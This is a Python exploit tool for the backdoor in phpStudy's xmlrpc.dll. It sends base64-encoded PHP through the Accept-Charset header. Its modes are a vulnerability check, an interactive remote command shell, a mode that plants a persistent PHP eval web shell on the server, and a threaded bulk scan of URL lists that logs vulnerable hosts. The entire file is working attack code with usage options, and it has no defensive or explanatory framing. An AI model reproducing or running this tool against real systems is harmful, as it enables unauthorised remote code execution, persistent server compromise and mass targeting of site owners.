# coding:utf-8
# Author:Writeup001
# Description:phpstudy 2016/2018 xmlrpc.dll backdoor rce
# Date:2019_10_28



import requests
import queue
import base64
import optparse
import threading
import datetime

headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }


lock = threading.Lock()

q0 = queue.Queue()
threadList = []
global succ
succ = 0

def checkPhpstudyBackdoor(tgtUrl,timeout):

    headers['Accept-Charset'] = 'ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw=='
    # exit('Wri7eTh3W0rld');
    # 无特定含义的字符串

    rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)
    # verify=False移除SSL认证
    
    rsp.encoding='utf-8'
    # print(rsp.text)

    if "Wri7eTh3W0rld" in rsp.text:
        return True
        # print('Target is vulnerable!!!' + '\n')
    else:
        return False
        # print('Target is not vulnerable.' + '\n')


def checkPhpstudyBackdoorBatch(timeout, doorSuccess):

    headers['Accept-Charset'] = 'ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw=='
    global countLines
    while (not q0.empty()):

        tgtUrl = q0.get()
        qcount = q0.qsize()
        print ('Checking: ' + tgtUrl + ' ---[' + str(countLines - qcount) + '/' + str(countLines) + ']')

        try:
            rst = requests.get(tgtUrl, headers=headers, timeout=timeout, verify=False)
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except:
            continue

        if rst.status_code == 200 and ("Wri7eTh3W0rld" in rst.text):
            print ('Target is vulnerable!!!---' + tgtUrl + '\n')
            lock.acquire()
            doorSuccess.write('Target is vulnerable!!!---' + tgtUrl + '\n')
            lock.release()
            global succ
            succ = succ + 1

        else:
            continue



def getCmdShellPhpstudyBackdoor(tgtUrl,timeout):
    #pass

    while True:
        command = input("cmd>>> ")
        if command == 'exit':
            break

        command = "system(\"" + command + "\");"
        #system("whoami");
        command.encode('utf-8')
        command = base64.b64encode(command.encode('utf-8'))
        headers['Accept-Charset'] = command
        cmdResult = requests.get(tgtUrl, headers=headers, verify=False,timeout=7)
        
        cmdResult.encoding='gbk'
        #因为 phpStudy 只有 Windows 版存在漏洞，Windows 系统使用的是 GBK 编码。
        #只读取<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">之前文件信息
        if cmdResult.text.split('<!')[0] == '':
            print('Command Error!')
        else:
            print (cmdResult.text.split('<!')[0])
        


def phpstudyBackdoorGetshell(tgtUrl,timeout):

    
    print ('Using current web path:WWW' + '\n')
    #headers['Accept-Charset'] = 'c3lzdGVtKCcgRUNITyBePD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Xj4+Ii4vZGVtb24ucGhwICcpOw=='
    #system(' ECHO ^<?php @eval($_POST[cmd]); ?^>>"./demon.php ');
    # 写一个一句话木马写入进 phpinfo.php 文件
    b64exp = "system(' ECHO ^<?php @eval($_GET[cmd]); ?^> >> ./phpStudyBackDoor.php');"
    b64exp = base64.b64encode(b64exp.encode('utf-8'))
    headers['Accept-Charset'] = b64exp

    rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)

    #print rsp.text.encode('utf-8')

    if rsp.status_code == 200:
        backDoorUrl = tgtUrl + '/phpStudyBackDoor.php'
        print(backDoorUrl)
        rsp1 = requests.get(backDoorUrl,verify=False,timeout=timeout)
        print(rsp1.text)
        if (rsp1.status_code == 200):

            #return True
            print ('Getshell successed!!!\n' + 'Shell addr:' + backDoorUrl + '\n')
            print('Please test:' + backDoorUrl + '?cmd=phpinfo();' )
        else:
            #return False
            print ('Getshell failed. \n'+'Maybe the file directory does not have permissions.')
            print('You can try to change the file directory.\n')
    else:
        print ('Something Error!')




if __name__ == '__main__':
    print ('''
		********************************
		*     phpStudy BackDoor RCE    * 
		*       Coded by Writeup       * 
		********************************
		''')
    #创建一个OPtionParser 对象
    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')

    #添加命令行参数
    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')
    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath[exploit default]')
    parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    parser.add_option('--getshell', dest='getshell',action='store_true', help='get webshell')
    parser.add_option('--cmdshell', dest='cmdshell',action='store_true', help='cmd shell mode')


    #解析传入的命令行参数
    (options, args) = parser.parse_args()

    # check = options.check
    timeout = options.timeout
    tgtUrl = options.tgtUrl
    getshell = options.getshell
    cmdshell = options.cmdshell

    
    # python phpStudyBackDoor.py -u "http://192.168.80.128"
    if tgtUrl and (cmdshell is None) and (getshell is None):
        if(checkPhpstudyBackdoor(tgtUrl,timeout)):
            print ('Target is vulnerable!!!' + '\n')
        else:
            print ('Target is not vulnerable.' + '\n')
    
    # python phpStudyBackDoor.py -u "http://192.168.80.128" --cmdshell
    if tgtUrl and cmdshell and (getshell is None):
        if (checkPhpstudyBackdoor(tgtUrl,timeout)):
            print ('Target is vulnerable!!! Entering cmdshell...' + '\n')
            getCmdShellPhpstudyBackdoor(tgtUrl,timeout)
        else:
            print ('Target is not vulnerable.' + '\n')
            pass
            

        

    # python phpStudyBackDoor.py -u "http://192.168.80.128" --getshell
    if tgtUrl and (cmdshell is None) and getshell:
        phpstudyBackdoorGetshell(tgtUrl,timeout)

    # python phpStudyBackDoor.py -u "http://192.168.80.128" -f url.txt
    if options.tgtUrlsPath:
        tgtFilePath = options.tgtUrlsPath
        threads = options.threads
        # 获取当前时间
        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')

        doorSuccess = open(str(nowtime) + '_' + 'success.txt', 'w')
        urlsFile = open(tgtFilePath)
        global countLines
        countLines = len(open(tgtFilePath, 'r').readlines())

        print ('===Total ' + str(countLines) + ' urls===')

        for urls in urlsFile:
            fullUrls = urls.strip()
            q0.put(fullUrls)
        for thread in range(threads):
            t = threading.Thread(target=checkPhpstudyBackdoorBatch, args=(timeout, doorSuccess))
            t.start()
            threadList.append(t)
        for th in threadList:
            th.join()

        print ('===Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']===')
        print ('Results were saved in current path: ' + str(nowtime) + '_success.txt')
        doorSuccess.close()
